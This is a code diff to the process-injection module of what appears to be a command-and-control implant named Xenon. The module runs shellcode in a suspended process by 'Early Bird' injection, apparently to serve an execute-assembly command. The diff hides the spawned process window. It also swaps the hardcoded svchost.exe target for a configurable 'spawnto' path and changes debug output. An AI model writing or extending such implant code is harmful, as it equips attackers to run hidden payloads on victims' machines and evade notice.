@@ -1,8 +1,6 @@
 #include "Inject.h"
 
-
-// #ifdef 
-
+#include "Xenon.h"
 #include "Config.h"
 
 #ifdef INCLUDE_CMD_EXECUTE_ASSEMBLY
@@ -41,6 +39,9 @@ BOOL CreateTemporaryProcess(LPCSTR lpPath, DWORD* dwProcessId, HANDLE* hProcess,
 	Si.hStdOutput = hStdOutWrite;
 	Si.hStdError = hStdOutWrite;
 	Si.dwFlags |= STARTF_USESTDHANDLES;
+	// Hide Window
+	Si.dwFlags |= STARTF_USESHOWWINDOW;
+	Si.wShowWindow = SW_HIDE;
 
 	_dbg("\t[i] Running Suspended Process: \"%s\" ... \n", lpPath);
 
@@ -121,7 +122,8 @@ BOOL InjectProcessViaEarlyBird(_In_ PBYTE buf, _In_ SIZE_T szShellcodeLen, _Out_
 		TODO - move settings to the global instance xenonConfig
 	*/
 
-	LPCSTR sProcName = "C:\\Windows\\System32\\svchost.exe";		// Full path to process
+	// LPCSTR sProcName = "C:\\Windows\\System32\\svchost.exe";		// Full path to process
+	LPCSTR sProcName = xenonConfig->spawnto;						// Full path to process
 	DWORD dwProcId = NULL;
 	HANDLE hProcess = NULL;
 	HANDLE hThread = NULL;
@@ -158,6 +160,7 @@ BOOL InjectProcessViaEarlyBird(_In_ PBYTE buf, _In_ SIZE_T szShellcodeLen, _Out_
 		char tempBuffer[1024];
 
 		BOOL success = ReadFile(hStdOutRead, tempBuffer, chunk - 1, &bytesRead, NULL);
+		_dbg("BYTES READ: %d", bytesRead);
 		if (!success || bytesRead == 0) {
 			break;  // No more data
 		}
@@ -178,15 +181,14 @@ BOOL InjectProcessViaEarlyBird(_In_ PBYTE buf, _In_ SIZE_T szShellcodeLen, _Out_
 		memcpy(outputBuffer + totalSize, tempBuffer, bytesRead);
 		totalSize += bytesRead;
 	}
-	// Null-terminate and print the full output
+
+	// Output buffer
 	outputBuffer[totalSize] = '\0';
-	
-	// Output data
+
 	*outData = outputBuffer;
 
 	CloseHandle(hStdOutRead);
 
-	_dbg("[#] DONE\n");
 	return TRUE;
 }
 
